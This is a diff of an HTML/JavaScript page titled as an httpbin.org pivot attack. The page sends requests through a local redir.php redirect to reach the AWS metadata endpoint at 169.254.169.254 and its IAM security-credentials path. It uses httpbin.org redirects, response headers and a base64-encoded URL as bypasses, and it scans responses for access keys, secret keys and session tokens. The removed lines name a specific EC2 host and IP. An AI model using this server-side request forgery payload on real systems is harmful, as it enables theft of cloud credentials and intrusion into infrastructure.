@@ -1,86 +1,76 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>External Reflection Attack</title>
+    <title>httpbin.org Pivot Attack</title>
 </head>
 <body>
-    <h1>🪞 External Service Reflection Attack</h1>
+    <h1>🎯 Using httpbin.org as Attack Pivot</h1>
     <div id="results"></div>
     
     <script>
         var results = "";
         
-        // Since external requests work, use services that might reflect internal info
-        var reflectionServices = [
-            // Services that reflect headers (might show internal environment)
+        // Use httpbin.org's redirect functionality to access internal services
+        var pivotAttempts = [
+            // Try httpbin.org redirect to AWS metadata
+            'http://httpbin.org/redirect-to?url=http://169.254.169.254/latest/meta-data/',
+            'http://httpbin.org/redirect-to?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/',
+            'http://httpbin.org/redirect-to?url=http://127.0.0.1/',
+            'http://httpbin.org/redirect-to?url=http://localhost/',
+            
+            // Try POST requests to different endpoints
+            'http://httpbin.org/post',
+            'http://httpbin.org/put', 
+            'http://httpbin.org/patch',
+            'http://httpbin.org/delete',
+            
+            // Try to use httpbin.org to make requests with custom headers
+            'http://httpbin.org/response-headers?X-Custom-Header=test',
+            'http://httpbin.org/response-headers?Location=http://169.254.169.254/latest/meta-data/',
+            
+            // Test different httpbin.org features that might help
+            'http://httpbin.org/cookies/set/test/value',
+            'http://httpbin.org/basic-auth/user/pass',
+            'http://httpbin.org/bearer',
+            
+            // Try httpbin.org endpoints that might reveal server info
+            'http://httpbin.org/user-agent',
             'http://httpbin.org/headers',
-            'http://httpbin.org/anything',
-            'http://httpbin.org/anything/test',
+            'http://httpbin.org/ip',
+            
+            // Test if we can use httpbin.org to proxy requests
+            'http://httpbin.org/anything/proxy-test',
+            
+            // Try subdomain variations that might be allowed
+            'http://eu.httpbin.org/get',
+            'http://na.httpbin.org/get', 
+            'http://httpbingo.org/get',
             'http://postman-echo.com/get',
-            'http://postman-echo.com/headers',
-            
-            // Services that might trigger different behavior
-            'http://httpbin.org/status/500',
-            'http://httpbin.org/delay/1',
-            'http://httpbin.org/redirect/1',
-            
-            // Try to access webhook services (might reveal IP/environment)
-            'http://webhook.site/unique-id',
-            'http://requestbin.com',
-            
-            // Try to trigger error messages that might leak info
-            'http://httpbin.org/status/404',
-            'http://httpbin.org/xml',
-            'http://httpbin.org/html',
-            
-            // Test different protocols if supported
-            'https://httpbin.org/get',
-            'https://httpbin.org/headers',
-            
-            // Try FTP if supported (might reveal more info)
-            'ftp://httpbin.org',
-            
-            // Try different ports on httpbin.org
-            'http://httpbin.org:8080/',
-            'http://httpbin.org:443/',
-            
-            // Test internal domains that might be accessible externally
-            'http://metadata.amazonaws.com',
-            'http://169.254.169.254.amazonaws.com',
-            
-            // Check if we can reach other AWS services
-            'http://s3.amazonaws.com',
-            'http://ec2.amazonaws.com',
-            
-            // Try to access the target server from external perspective
-            'http://54.209.100.76.amazonaws.com',
-            'http://ec2-54-209-100-76.compute-1.amazonaws.com'
+            'http://httpbin.org/base64/aHR0cDovLzE2OS4yNTQuMTY5LjI1NC9sYXRlc3QvbWV0YS1kYXRhLw%3D%3D', // base64 encoded metadata URL
         ];
         
-        for(var i = 0; i < reflectionServices.length; i++) {
+        for(var i = 0; i < pivotAttempts.length; i++) {
             try {
-                results += "<h3>🪞 " + reflectionServices[i] + "</h3>";
+                results += "<h3>🔍 " + (i+1) + ": " + pivotAttempts[i] + "</h3>";
                 var xhr = new XMLHttpRequest();
-                xhr.open('GET', 'http://localhost/redir.php?url=' + reflectionServices[i], false);
+                xhr.open('GET', 'http://localhost/redir.php?url=' + encodeURIComponent(pivotAttempts[i]), false);
                 xhr.send();
                 
                 if(xhr.responseText && xhr.responseText.length > 10) {
-                    results += "<div style='background:#e8f5e8;padding:8px;border:1px solid green;'>📡 RESPONSE: " + xhr.responseText.length + " bytes</div>";
+                    results += "<div style='background:#e8f5e8;padding:10px;border:1px solid green;'>✅ SUCCESS: " + xhr.responseText.length + " bytes</div>";
                     
-                    // Look for AWS-related information in response
+                    // Look for AWS metadata or internal service responses
                     var text = xhr.responseText.toLowerCase();
-                    if(text.includes('aws') || text.includes('amazon') || text.includes('ec2') || text.includes('s3')) {
-                        results += "<div style='background:#ff6b6b;color:white;padding:5px;'>🚨 AWS KEYWORDS DETECTED! 🚨</div>";
+                    if(text.includes('ami-') || text.includes('instance-') || text.includes('iam') || text.includes('security-credentials')) {
+                        results += "<div style='background:#ff6b6b;color:white;padding:8px;border:2px solid red;'>🚨 AWS METADATA DETECTED! 🚨</div>";
+                    }
+                    if(text.includes('accesskeyid') || text.includes('secretaccesskey') || text.includes('sessiontoken')) {
+                        results += "<div style='background:#ffa500;color:white;padding:8px;border:2px solid orange;'>🔑 AWS CREDENTIALS FOUND! 🔑</div>";
                     }
                     
-                    // Look for credential-like strings
-                    if(text.includes('key') || text.includes('secret') || text.includes('token') || text.includes('credential')) {
-                        results += "<div style='background:#ffa500;color:white;padding:5px;'>🔑 CREDENTIAL KEYWORDS FOUND!</div>";
-                    }
-                    
-                    results += "<div style='background:#f0f0f0;padding:8px;max-height:100px;overflow:scroll;font-size:10px;'>" + xhr.responseText.substring(0, 500) + "</div>";
+                    results += "<div style='background:#f0f0f0;padding:8px;max-height:150px;overflow:scroll;font-size:10px;white-space:pre-wrap;'>" + xhr.responseText.substring(0, 800) + "</div>";
                 } else {
-                    results += "<div style='background:#ffe8e8;padding:3px;'>❌ No significant response</div>";
+                    results += "<div style='background:#ffe8e8;padding:3px;'>❌ No response</div>";
                 }
             } catch(e) {
                 results += "<div style='background:#ffe8e8;padding:3px;'>❌ " + e.message.substring(0, 50) + "</div>";
